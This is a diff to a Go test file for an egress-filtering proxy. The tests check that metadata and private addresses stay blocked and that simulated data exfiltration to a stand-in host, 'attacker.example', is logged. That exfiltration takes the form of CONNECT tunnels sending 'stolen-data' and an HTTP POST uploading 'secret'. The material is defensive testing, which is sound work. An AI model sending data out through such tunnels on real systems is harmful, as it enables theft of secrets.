@@ -1,9 +1,17 @@
 package netpolicy
 
 import (
+	"bufio"
+	"context"
+	"encoding/json"
+	"fmt"
+	"io"
 	"net"
+	"net/http"
+	"net/url"
 	"strings"
 	"testing"
+	"time"
 )
 
 func learningList(t *testing.T, deny ...string) *Allowlist {
@@ -59,7 +67,7 @@ func TestLearningAdmitsNoLiteralAddress(t *testing.T) {
 func TestLearningDoesNotOpenInfrastructure(t *testing.T) {
 	a := learningList(t)
 	for _, ip := range []string{"127.0.0.1", "169.254.169.254", "10.0.0.1", "172.17.0.1"} {
-		if a.AllowsIP(net.ParseIP(ip)) {
+		if a.AllowsIP(net.ParseIP(ip), 80) {
 			t.Errorf("learning let the infrastructure address %s through", ip)
 		}
 	}
@@ -133,9 +141,10 @@ func TestReservedAndWrappedAddressesAreInfrastructure(t *testing.T) {
 		"255.255.255.255",
 		"64:ff9b::a9fe:a9fe", // NAT64 around 169.254.169.254
 		"64:ff9b::a00:1",     // NAT64 around 10.0.0.1
-		"2002:a9fe:a9fe::1",  // 6to4 around the metadata endpoint
-		"::a9fe:a9fe",        // IPv4-compatible metadata endpoint
-		"::ffff:10.0.0.1",    // IPv4-mapped private
+		"64:ff9b:1::a9fe:a9fe",
+		"2002:a9fe:a9fe::1", // 6to4 around the metadata endpoint
+		"::a9fe:a9fe",       // IPv4-compatible metadata endpoint
+		"::ffff:10.0.0.1",
 		"fd07:b51a:cc66:f0::fe",
 	} {
 		if !isInfrastructure(net.ParseIP(s)) {
@@ -178,4 +187,194 @@ func TestAZonedAddressIsNeverDialled(t *testing.T) {
 			t.Errorf("%s: offers a grant no rule can express: %v", addr, err)
 		}
 	}
+}
+
+// A literal grant opens its own port only. Any name can resolve to the
+// address, so a port-blind exception reaches every service on it.
+func TestAnInfrastructureGrantOpensOnlyItsPort(t *testing.T) {
+	p := NewProxy(mustParse(t, "127.0.0.1:443").WithLearning())
+	if err := p.permitAddress("127.0.0.1:443"); err != nil {
+		t.Errorf("the granted port was refused: %v", err)
+	}
+	for _, addr := range []string{"127.0.0.1:2375", "127.0.0.1:22", "127.0.0.1:80"} {
+		if p.permitAddress(addr) == nil {
+			t.Errorf("a grant of 127.0.0.1:443 opened %s", addr)
+		}
+	}
+}
+
+func TestAConnectionHeldOpenIsStillRecorded(t *testing.T) {
+	open := `{"action":"open","host":"attacker.example","port":443,"method":"CONNECT"}`
+	done := `{"action":"allow","host":"attacker.example","port":443,"method":"CONNECT","bytes":9}`
+
+	if d := Destinations(open + "\n"); len(d) != 1 || d[0].Count != 1 {
+		t.Errorf("a connection that never closed was not recorded: %+v", d)
+	}
+	if d := Destinations(open + "\n" + done + "\n"); len(d) != 1 || d[0].Count != 1 {
+		t.Errorf("a finished connection was counted twice: %+v", d)
+	}
+}
+
+// The far end receives the payload and never closes, so the tunnel's
+// close-time "allow" is never written.
+func TestATunnelIsLoggedWhenItConnects(t *testing.T) {
+	ln, err := net.Listen("tcp", "127.0.0.1:0")
+	if err != nil {
+		t.Fatal(err)
+	}
+	defer ln.Close()
+	got := make(chan string, 1)
+	stop := make(chan struct{})
+	defer close(stop)
+	go func() {
+		c, err := ln.Accept()
+		if err != nil {
+			return
+		}
+		b := make([]byte, 16)
+		n, _ := c.Read(b)
+		got <- string(b[:n])
+		<-stop
+		_ = c.Close()
+	}()
+
+	c := &collector{}
+	p := NewProxy(mustParse(t, "attacker.example"))
+	p.Emit = c.emit
+	p.Dial = func(ctx context.Context, _, _ string) (net.Conn, error) {
+		return net.Dial("tcp", ln.Addr().String())
+	}
+	conn, err := net.Dial("tcp", startProxy(t, p))
+	if err != nil {
+		t.Fatal(err)
+	}
+	defer conn.Close()
+	fmt.Fprintf(conn, "CONNECT attacker.example:443 HTTP/1.1\r\nHost: attacker.example:443\r\n\r\n")
+	br := bufio.NewReader(conn)
+	if line, _ := br.ReadString('\n'); !strings.Contains(line, "200") {
+		t.Fatalf("tunnel refused: %q", line)
+	}
+	_, _ = br.ReadString('\n')
+	fmt.Fprint(conn, "stolen-data")
+	if s := <-got; s != "stolen-data" {
+		t.Fatalf("upstream got %q", s)
+	}
+
+	deadline := time.Now().Add(2 * time.Second)
+	for time.Now().Before(deadline) {
+		for _, e := range c.all() {
+			if e.Action == "open" && e.Host == "attacker.example" {
+				return
+			}
+		}
+		time.Sleep(10 * time.Millisecond)
+	}
+	t.Fatalf("nothing recorded while the tunnel is held open: %+v", c.all())
+}
+
+// The upload arrives and the far end closes without a response, so the only
+// other event is an "error", which is not a contact.
+func TestAnUnansweredUploadIsRecorded(t *testing.T) {
+	ln, err := net.Listen("tcp", "127.0.0.1:0")
+	if err != nil {
+		t.Fatal(err)
+	}
+	defer ln.Close()
+	got := make(chan string, 1)
+	go func() {
+		c, err := ln.Accept()
+		if err != nil {
+			return
+		}
+		req, err := http.ReadRequest(bufio.NewReader(c))
+		if err == nil {
+			b, _ := io.ReadAll(req.Body)
+			got <- string(b)
+		}
+		_ = c.Close()
+	}()
+
+	c := &collector{}
+	p := NewProxy(mustParse(t, "attacker.example"))
+	p.Emit = c.emit
+	p.Dial = func(ctx context.Context, _, _ string) (net.Conn, error) {
+		return net.Dial("tcp", ln.Addr().String())
+	}
+	proxyURL, _ := url.Parse("http://" + startProxy(t, p))
+	client := &http.Client{Transport: &http.Transport{Proxy: http.ProxyURL(proxyURL)}, Timeout: 5 * time.Second}
+	resp, err := client.Post("http://attacker.example/up", "text/plain", strings.NewReader("secret"))
+	if err == nil {
+		_ = resp.Body.Close()
+	}
+	if s := <-got; s != "secret" {
+		t.Fatalf("upstream got %q", s)
+	}
+	if !recorded(c, "attacker.example") {
+		t.Fatalf("an upload that reached the far end is not recorded: %+v", c.all())
+	}
+}
+
+// A TLS record header announcing 16 KB, then payload, never completed: the
+// sniffer waits for the whole record and never settles.
+func TestAnUnfinishedTLSRecordIsRecorded(t *testing.T) {
+	ln, err := net.Listen("tcp", "127.0.0.1:0")
+	if err != nil {
+		t.Fatal(err)
+	}
+	defer ln.Close()
+	stop := make(chan struct{})
+	defer close(stop)
+	got := make(chan int, 1)
+	go func() {
+		c, err := ln.Accept()
+		if err != nil {
+			return
+		}
+		b := make([]byte, 4096)
+		n, _ := io.ReadAtLeast(c, b, 100)
+		got <- n
+		<-stop
+		_ = c.Close()
+	}()
+
+	c := &collector{}
+	p := NewProxy(mustParse(t, "attacker.example"))
+	p.Emit = c.emit
+	p.Dial = func(ctx context.Context, _, _ string) (net.Conn, error) {
+		return net.Dial("tcp", ln.Addr().String())
+	}
+	conn, err := net.Dial("tcp", startProxy(t, p))
+	if err != nil {
+		t.Fatal(err)
+	}
+	defer conn.Close()
+	fmt.Fprintf(conn, "CONNECT attacker.example:443 HTTP/1.1\r\nHost: attacker.example:443\r\n\r\n")
+	br := bufio.NewReader(conn)
+	_, _ = br.ReadString('\n')
+	_, _ = br.ReadString('\n')
+	_, _ = conn.Write(append([]byte{0x16, 0x03, 0x01, 0x40, 0x00}, []byte(strings.Repeat("x", 200))...))
+	if n := <-got; n < 100 {
+		t.Fatalf("upstream got only %d bytes", n)
+	}
+	if !recorded(c, "attacker.example") {
+		t.Fatalf("a tunnel carrying data is not recorded: %+v", c.all())
+	}
+}
+
+func recorded(c *collector, host string) bool {
+	deadline := time.Now().Add(2 * time.Second)
+	for time.Now().Before(deadline) {
+		var logs strings.Builder
+		for _, e := range c.all() {
+			b, _ := json.Marshal(e)
+			logs.Write(append(b, '\n'))
+		}
+		for _, d := range Destinations(logs.String()) {
+			if d.Host == host && !d.Denied {
+				return true
+			}
+		}
+		time.Sleep(10 * time.Millisecond)
+	}
+	return false
 }
